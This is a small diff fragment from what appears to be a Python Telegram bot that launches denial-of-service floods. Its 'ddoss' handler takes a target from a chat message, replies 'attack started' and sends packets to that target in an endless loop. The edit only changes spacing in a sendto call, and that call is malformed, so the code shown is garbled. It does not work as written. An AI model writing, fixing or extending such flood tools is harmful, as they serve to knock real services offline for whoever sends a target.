@@ -28,7 +28,7 @@ def ddoss (message):
   target = message.text
   bot.send_message(message.chat.id, "attack started")
   while True:
-    client.sendto(bytes, (target, thread = 500))
+    client.sendto(bytes, (target, thread=500))
    
 @bot.message_handler(commands=['author'])
 def author (message):
